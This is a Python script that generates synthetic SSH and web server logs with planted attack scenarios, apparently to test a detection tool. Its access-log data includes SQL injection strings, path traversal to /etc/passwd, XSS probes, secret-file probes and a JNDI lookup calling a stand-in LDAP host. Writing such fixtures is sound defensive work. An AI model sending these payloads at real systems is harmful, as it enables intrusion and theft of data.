"""Generate realistic but completely synthetic log files for demos and tests.

Every IP address comes from the ranges reserved for documentation (RFC 5737:
192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) or from private ranges, so
nothing here points at a real machine. The attack scenarios are fixed, which
lets the tests check that the tool finds exactly what was planted.

Usage:  python tools/generate_sample_logs.py samples
"""
import os
import random
import sys
from datetime import datetime, timedelta, timezone

BASE = datetime(2026, 10, 1, 8, 0, 0, tzinfo=timezone.utc)
HOST = "web01"


def _syslog(dt, msg, proc="sshd", pid=None):
    pid = pid or 1000 + dt.second
    return f"{dt:%b} {dt.day:>2} {dt:%H:%M:%S} {HOST} {proc}[{pid}]: {msg}"


def _access(dt, ip, method, path, status, size, ua, ref="-"):
    stamp = dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'


BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36"


def make_auth(rng):
    rows = []  # (datetime, line)

    # Normal activity: two admins logging in from the office network
    for hour in (8, 9, 11, 13, 15, 17):
        dt = BASE + timedelta(hours=hour - 8, minutes=rng.randint(0, 40), seconds=rng.randint(0, 59))
        rows.append((dt, _syslog(dt, f"Accepted publickey for alice from 10.0.0.15 port {rng.randint(40000, 60000)} ssh2")))
    for hour in (9, 12, 16):
        dt = BASE + timedelta(hours=hour - 8, minutes=rng.randint(0, 40), seconds=rng.randint(0, 59))
        rows.append((dt, _syslog(dt, f"Accepted password for bob from 10.0.0.23 port {rng.randint(40000, 60000)} ssh2")))
    # bob mistypes his password once (must NOT trigger anything)
    dt = BASE + timedelta(hours=4, minutes=2)
    rows.append((dt, _syslog(dt, "Failed password for bob from 10.0.0.23 port 51234 ssh2")))
    dt += timedelta(seconds=9)
    rows.append((dt, _syslog(dt, "Accepted password for bob from 10.0.0.23 port 51236 ssh2")))
    # a single stray probe from the internet (below every threshold)
    dt = BASE + timedelta(hours=2, minutes=14)
    rows.append((dt, _syslog(dt, "Failed password for root from 192.0.2.10 port 40022 ssh2")))

    # Scenario A: classic brute force against root, 60 attempts in about 3 minutes
    ip, dt = "203.0.113.50", BASE + timedelta(hours=3, minutes=10)
    for n in range(60):
        dt += timedelta(seconds=rng.randint(1, 4))
        user = rng.choice(["root"] * 8 + ["admin", "ubuntu", "test"])
        port = 30000 + n
        if user == "root":
            rows.append((dt, _syslog(dt, f"Failed password for root from {ip} port {port} ssh2")))
        else:
            rows.append((dt, _syslog(dt, f"Invalid user {user} from {ip} port {port}")))
            rows.append((dt, _syslog(dt, f"Failed password for invalid user {user} from {ip} port {port} ssh2")))

    # Scenario B: password spraying, 12 accounts x 2 attempts, slow and quiet
    ip, dt = "198.51.100.23", BASE + timedelta(hours=5, minutes=30)
    names = ["root", "admin", "oracle", "postgres", "ubuntu", "git", "ftp", "test", "user", "guest",
             "jenkins", "deploy"]
    for _round in range(2):
        for name in names:
            dt += timedelta(seconds=rng.randint(12, 20))
            rows.append((dt, _syslog(dt, f"Failed password for invalid user {name} from {ip} port {rng.randint(30000, 60000)} ssh2")))

    # Scenario C: brute force on 'deploy' that ends in a successful login (the dangerous one)
    ip, dt = "203.0.113.77", BASE + timedelta(hours=6, minutes=45)
    for n in range(14):
        dt += timedelta(seconds=rng.randint(8, 20))
        rows.append((dt, _syslog(dt, f"Failed password for deploy from {ip} port {41000 + n} ssh2")))
    dt += timedelta(seconds=11)
    rows.append((dt, _syslog(dt, f"Accepted password for deploy from {ip} port 41099 ssh2")))

    # Scenario I: ONE account (root) attacked from 6 IPs, 4 tries each. Every IP stays under
    # the per-IP limit, so only the per-account rule can see it.
    dt = BASE + timedelta(hours=1, minutes=20)
    ips = [f"203.0.113.{n}" for n in range(101, 107)]
    for _round in range(4):
        for ip in ips:
            dt += timedelta(seconds=rng.randint(3, 8))
            rows.append((dt, _syslog(dt, f"Failed password for root from {ip} port {rng.randint(30000, 60000)} ssh2")))

    # Scenario J: server-wide surge. 40 IPs x 3 tries spread over 15 accounts in about 4 minutes.
    # No IP and no account looks suspicious alone; only the whole-server view shows it.
    dt = BASE + timedelta(hours=7, minutes=30)
    ips = [f"198.51.100.{n}" for n in range(110, 150)]
    accounts = ["root", "admin", "oracle", "postgres", "ubuntu", "git", "ftp", "test", "user", "guest",
                "jenkins", "deploy", "pi", "support", "web"]
    k = 0
    for _round in range(3):
        for ip in ips:
            dt += timedelta(seconds=rng.randint(1, 3))
            name = accounts[k % len(accounts)]
            k += 1
            who = "root" if name == "root" else f"invalid user {name}"
            rows.append((dt, _syslog(dt, f"Failed password for {who} from {ip} port {rng.randint(30000, 60000)} ssh2")))

    # Background noise: the constant trickle of random internet scanners every public SSH server gets.
    # Roughly one attempt every few minutes in total. This must NOT raise any alert.
    pool = [f"203.0.113.{n}" for n in range(150, 250)]
    for _ in range(100):
        dt = BASE + timedelta(seconds=rng.randint(0, 10 * 3600))
        name = rng.choice(["root", "admin", "user", "test", "oracle", "pi", "ubuntu"])
        who = "root" if name == "root" else f"invalid user {name}"
        rows.append((dt, _syslog(dt, f"Failed password for {who} from {rng.choice(pool)} port {rng.randint(30000, 60000)} ssh2")))

    # Unrelated noise that real auth logs always contain
    for hour in range(0, 10):
        dt = BASE + timedelta(hours=hour, minutes=1)
        rows.append((dt, _syslog(dt, "(root) CMD (run-parts /etc/cron.hourly)", proc="CRON", pid=777)))
        rows.append((dt, _syslog(dt, "pam_unix(sudo:session): session opened for user root", proc="sudo", pid=888)))

    rows.sort(key=lambda r: r[0])
    return [line for _, line in rows]


def make_access(rng):
    rows = []
    pages = ["/", "/about", "/products", "/products/1", "/products/2", "/products/3", "/contact",
             "/api/items", "/static/app.js", "/static/style.css", "/blog"]
    # Normal traffic from employees and ordinary visitors
    visitors = ["10.0.0.15", "10.0.0.23", "192.0.2.31", "192.0.2.44", "192.0.2.58", "192.0.2.77"]
    for _ in range(320):
        dt = BASE + timedelta(seconds=rng.randint(0, 10 * 3600))
        status = rng.choices([200, 304, 404], weights=[90, 8, 2])[0]
        rows.append((dt, _access(dt, rng.choice(visitors), "GET", rng.choice(pages), status,
                                 rng.randint(300, 9000), BROWSER)))

    # Scenario D: Nikto-style content discovery, 40 missing pages in about a minute
    ip, dt = "198.51.100.99", BASE + timedelta(hours=4, minutes=5)
    wordlist = ["admin/", "backup.zip", "test.php", "cgi-bin/test.cgi", "old/", "db.sql", "upload/",
                "temp/", "shell.php", "login.php", "setup/", "install.php", "dev/", "staging/",
                "config.old", "site.tar.gz", "data/", "logs/", "debug.php", "info.php", "api/v1/",
                "private/", "tmp/", "web.config", "readme.txt", "changelog.txt", "license.txt",
                "images/uploads/", "includes/", "src/", "bin/", "console/", "manager/html",
                "jmx-console/", "status", "trace.axd", "elmah.axd", "robots.bak", "index.bak", "crossdomain.xml"]
    for word in wordlist:
        dt += timedelta(milliseconds=rng.randint(500, 1800))
        rows.append((dt, _access(dt, ip, "GET", "/" + word, 404, 196, "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)")))

    # Scenario E: SQL injection, path traversal and a JNDI lookup from one IP
    ip, dt = "203.0.113.9", BASE + timedelta(hours=5, minutes=2)
    sqli = ["1%27%20OR%20%271%27%3D%271", "1%20UNION%20SELECT%20NULL,NULL,NULL--", "1%20AND%20SLEEP(5)",
            "1%27%20AND%201%3D1--", "-1%20UNION%20ALL%20SELECT%20table_name%20FROM%20information_schema.tables"]
    for n in range(25):
        dt += timedelta(seconds=rng.randint(1, 3))
        payload = sqli[n % len(sqli)]
        rows.append((dt, _access(dt, ip, "GET", f"/products?id={payload}", rng.choice([200, 500, 500]),
                                 rng.randint(200, 4000), "sqlmap/1.7.2#stable (https://sqlmap.org)")))
    for traversal in ["/download?file=../../../../etc/passwd", "/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                      "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"]:
        dt += timedelta(seconds=2)
        rows.append((dt, _access(dt, ip, "GET", traversal, 400, 150, BROWSER)))
    dt += timedelta(seconds=2)
    rows.append((dt, _access(dt, ip, "GET", "/?q=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.5%3A1389%2Fa%7D", 200, 5000, BROWSER)))

    # Scenario F: reflected XSS attempts
    ip, dt = "203.0.113.30", BASE + timedelta(hours=2, minutes=40)
    for _ in range(3):
        dt += timedelta(seconds=5)
        rows.append((dt, _access(dt, ip, "GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, 3100, BROWSER)))

    # Scenario G: hunting for secrets and admin panels
    ip, dt = "203.0.113.120", BASE + timedelta(hours=7, minutes=15)
    for path in ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/server-status", "/xmlrpc.php"]:
        dt += timedelta(seconds=rng.randint(3, 9))
        rows.append((dt, _access(dt, ip, "GET", path, 404, 196, BROWSER)))

    # Scenario H: credential stuffing against a login API (18 attempts in about 2 minutes)
    ip, dt = "198.51.100.200", BASE + timedelta(hours=8, minutes=20)
    for _ in range(18):
        dt += timedelta(seconds=rng.randint(4, 9))
        rows.append((dt, _access(dt, ip, "POST", "/api/login", 401, 64, "python-requests/2.31.0")))

    rows.sort(key=lambda r: r[0])
    return [line for _, line in rows]


def generate(outdir, seed=42):
    rng = random.Random(seed)
    os.makedirs(outdir, exist_ok=True)
    auth_path = os.path.join(outdir, "auth.log")
    web_path = os.path.join(outdir, "access.log")
    with open(auth_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(make_auth(rng)) + "\n")
    with open(web_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(make_access(rng)) + "\n")
    return auth_path, web_path


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "samples"
    a, w = generate(out)
    print(f"Wrote {a} and {w}")
